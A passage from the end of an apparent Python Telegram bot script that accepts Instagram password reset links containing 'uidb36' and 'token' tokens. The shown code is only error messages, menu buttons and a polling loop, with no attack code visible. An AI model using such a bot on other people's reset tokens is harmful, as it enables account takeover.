                            msg = "❌ <b>Invalid Instagram reset link!</b>\n\nPlease send a valid Instagram password reset link that contains 'uidb36' and 'token'.\n\nClick back to return to menu."
                            keyboard = {
                                "inline_keyboard": [
                                    [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
                                ]
                            }
                            edit_or_send(chat_id, msg, active_msg_id, keyboard)
                        
                        else:
                            msg = "❌ <b>Invalid input!</b>\n\nSend an Instagram password reset link or use /start for menu."
                            keyboard = {
                                "inline_keyboard": [
                                    [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
                                ]
                            }
                            edit_or_send(chat_id, msg, active_msg_id, keyboard)
            
            time.sleep(0.5)
            
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(2)

if __name__ == "__main__":
    main()
